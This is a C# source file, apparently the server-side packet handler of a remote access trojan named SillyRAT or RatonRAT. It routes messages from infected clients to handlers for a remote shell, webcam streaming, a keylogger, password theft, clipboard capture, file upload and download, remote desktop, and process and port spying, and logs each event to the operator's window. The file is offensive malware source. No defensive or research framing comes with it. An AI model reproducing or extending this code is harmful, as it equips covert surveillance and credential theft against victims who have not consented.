using System.Windows.Forms;
using Stuff;
using Server.Connection;
using System.Threading;
using SillyRAT;
using System;
using System.Drawing;
using RatonRAT.Handlers.FileTransfer;

namespace Server.Handlers
{
    internal class HandlePacket
    {

        public SillyClient SillyClient { get; set; }
        public byte[] packet { get; set; }
        public void Run(object state)
        {
            if (packet == null) return;
            Unpack meow = new Unpack();
            meow.Unpacc(packet);
            switch (meow.GetAsString("Packet"))
            {
                case "listinfo":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Loading and checking client information, this will take some moments...", Color.FromArgb(72, 105, 171));
                        }));
                        new HandleClient(SillyClient, meow);
                        break;
                    }
                case "Clientinfo":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Got advanced client information", Color.FromArgb(98, 201, 255));
                        }));
                        new HandleInfo(SillyClient, meow);
                        break;
                    }
                case "Shell":
                    {
                        new HandleShell(SillyClient, meow);
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        Pack pack = new Pack();
                        pack.Set("Packet", "Ping");
                        pack.Set("Message", "From client !");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "Webcam":
                    {
                        new HandleWebcam(SillyClient, meow);
                        break;
                    }
                case "StopWebcam":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Got webcam stream packet stopped", Color.FromArgb(98, 201, 255));
                        }));
                        new HandleWebcam(SillyClient, meow);
                        break;
                    }
                case "ProcessSpy":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Process spy packet sent", Color.FromArgb(98, 201, 255));
                        }));
                        new HandleProcessManager(SillyClient, meow);
                        break;
                    }
                case "RemoteDesktop":
                    {
                        // Updates every ms, so don't log anything!
                        new HandleDesktop().Run(SillyClient, meow);
                        break;
                    }
                case "PortSpy":
                    {
                        new HandlePortManager(SillyClient, meow);
                        break;
                    }

                case "Keylogger":
                    {
                        new HandleKeylogger(SillyClient, meow);
                        break;
                    }
                case "Password":
                    {
                        new HandlePasswords(SillyClient, meow);
                        break;
                    }
                case "Manager":
                    {
                        new HandleFileManager(SillyClient, meow);
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().init(SillyClient, meow);
                        break;
                    }
                case "Preview":
                    {
                        new HandlePreview(SillyClient, meow);
                        break;
                    }
                case "ChatMessage":
                    {
                        new HandleChat(SillyClient, meow);
                        break;
                    }
                case "Clipboard":
                    {
                        new HandleClipboard(SillyClient, meow);
                        break;
                    }
                case "Download":
                    {
                        new HandleDownload().Run(SillyClient, meow);
                        break;
                    }
                case "Geo":
                    {
                        new HandleGeo(SillyClient, meow);
                        break;
                    }
                case "GetPing":
                    {
                        string ping = meow.GetAsString("Ping");
                        MessageBox.Show(ping, "Ping", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    }
                // other
                case "PluginMessage":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            string msgg = meow.GetAsString("Message");
                            Program.form2.AddLog("From plugin: " + msgg, Color.FromArgb(98, 201, 255));
                        }));
                        break;
                    }

                case "Error":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.checkLogs();
                            string error = meow.GetAsString("Error");
                            Program.form2.AddLog("Warning: " + error, Color.FromArgb(255, 164, 54));
                        }));
                         break;
                    }
                default:
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.checkLogs();
                            Program.form2.AddLog("Invalid server packet: " + meow.GetAsString("packet") , Color.FromArgb(255, 164, 54));
                        }));
                        break;
                    }
            }
        }
    }
}
